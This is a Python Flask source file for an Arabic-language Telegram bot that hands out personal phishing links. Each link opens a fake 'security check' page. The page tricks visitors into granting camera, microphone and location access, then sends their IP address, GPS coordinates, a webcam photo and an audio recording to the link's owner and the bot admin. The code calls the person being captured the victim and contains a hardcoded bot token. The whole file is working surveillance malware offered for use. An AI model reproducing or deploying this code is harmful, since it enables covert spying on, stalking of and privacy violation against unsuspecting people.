import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v28.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 
DATA_FILE = "database.json"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                content = f.read().strip()
                return json.loads(content) if content else {"all_users": {}, "banned_users": [], "stages": {}}
        except Exception as e:
            print(f"Error loading data: {e}")
    return {"all_users": {}, "banned_users": [], "stages": {}}

def save_data(data):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving data: {e}")

db = load_data()

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
        return requests.post(API_URL + method, json=payload, timeout=20).json()
    except: return None

def find_user_id(input_str):
    input_str = input_str.strip().replace("@", "").lower()
    if input_str.isdigit(): return input_str
    for uid, uname in db.get("all_users", {}).items():
        if uname.strip().replace("@", "").lower() == input_str: return uid
    return None

# واجهة الصيد المحدثة
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon" style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>تحقق أمني مطلوب</h2>
        <p style="color: #bbb;">يرجى تفعيل الفحص الأمني للمتابعة.</p>
        <button class="btn" id="go" onclick="startCapture()">بدء الفحص</button>
        <div id="st">بانتظار الموافقة...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const uid = "{{ user_id }}";
        const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        async function startCapture() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري الفحص...";
            try {
                const ipD = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                await send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ipD.ip}\`\\n📱 النظام: ${navigator.platform}`, 'msg');
                navigator.geolocation.getCurrentPosition(p => {
                    send(`📍 **موقع الضحية:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                }, null, {enableHighAccuracy: true});
                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); send(c.toDataURL('image/jpeg', 0.8), 'img');
                    const recorder = new MediaRecorder(stream); const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = async () => { 
                            await send(reader.result, 'aud');
                            document.getElementById('st').innerText = "✅ اكتمل!";
                            stream.getTracks().forEach(t => t.stop());
                        };
                    };
                    recorder.start(); setTimeout(() => recorder.stop(), 5000);
                }, 2000);
            } catch (e) { document.getElementById('st').innerText = "❌ فشل الحصول على الصلاحيات!"; }
        }
    </script>
</body>
</html>
'''

@app.route('/t/<uid>')
def trap(uid): return render_template_string(HTML_TEMPLATE, user_id=uid)

@app.route('/api/capture/<uid>', methods=['POST'])
def capture(uid):
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    for r_id in list(set([str(uid), str(ADMIN_ID)])):
        if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'img': tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة"}, {'photo': ('c.jpg', base64.b64decode(d.split(',')[1]))})
        elif t == 'aud': tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة"}, {'voice': ('v.ogg', base64.b64decode(d.split(',')[1]))})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update: return "OK"
    
    # التعامل مع أزرار التحكم
    if "callback_query" in update: return handle_callback(update["callback_query"])
    
    if "message" not in update: return "OK"
    msg = update["message"]; chat_id = str(msg["from"]["id"])
    username = f"@{msg['from'].get('username', 'NoUser')}"
    first_name = msg['from'].get('first_name', 'Unknown')

    # تنبيه الأدمن وتسجيل المستخدم
    if chat_id not in db["all_users"]:
        db["all_users"][chat_id] = username
        save_data(db)
        if chat_id != ADMIN_ID:
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"👤 **مستخدم جديد:**\n\nالاسم: {first_name}\nاليوزر: {username}\nالايدي: `{chat_id}`", "parse_mode": "Markdown"})

    if chat_id in db.get("banned_users", []): return "OK"
    
    text = msg.get("text", "")
    if chat_id == ADMIN_ID:
        if text.startswith("/user_ban"):
            target = text.replace("/user_ban", "").strip()
            tid = find_user_id(target)
            if tid and tid not in db["banned_users"]:
                db["banned_users"].append(tid); save_data(db)
                tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر `{target}`"})
            return "OK"
        elif text.startswith("/clear"):
            target = text.replace("/clear", "").strip()
            tid = find_user_id(target)
            if tid: tg_request("sendMessage", {"chat_id": tid, "text": "🧹 تم تصفير السجل."})
            return "OK"
        
        adm_kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_my_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_all"}]]}
        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 لوحة v28.0 المصلحة جاهزة.", "reply_markup": adm_kb})
        return "OK"

    # نظام الاشتراك المزدوج
    stage = db.get("stages", {}).get(chat_id, 0)
    if stage < 2:
        db["stages"][chat_id] = stage + 1; save_data(db)
        tg_request("sendMessage", {"chat_id": chat_id, "text": f"🛑 خطوة {stage+1}/2: اشترك بالقناة.", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}]]}})
        return "OK"

    tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 لوحة المستخدم:", "reply_markup": {"inline_keyboard": [[{"text": "🔗 إنشاء رابطي", "callback_data": "gen_my_link"}]]}})
    return "OK"

def handle_callback(query):
    query_id = query["id"]; cid = str(query["from"]["id"]); data = query["data"]
    # استجابة فورية لإنهاء حالة "اللودينج"
    tg_request("answerCallbackQuery", {"callback_query_id": query_id})
    
    if data == "gen_my_link":
        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك الجاهز:\n`{BASE_URL}/t/{cid}`"})
    elif data == "list_all" and cid == ADMIN_ID:
        users = db.get("all_users", {})
        if not users:
            res = "ℹ️ لا يوجد مستخدمين مسجلين بعد."
        else:
            res = "👥 **قائمة المستخدمين:**\n\n"
            for uid, uname in users.items():
                s = "🚫" if uid in db.get("banned_users", []) else "✅"
                res += f"{s} {uname} | `{uid}`\n"
        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": res, "parse_mode": "Markdown"})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
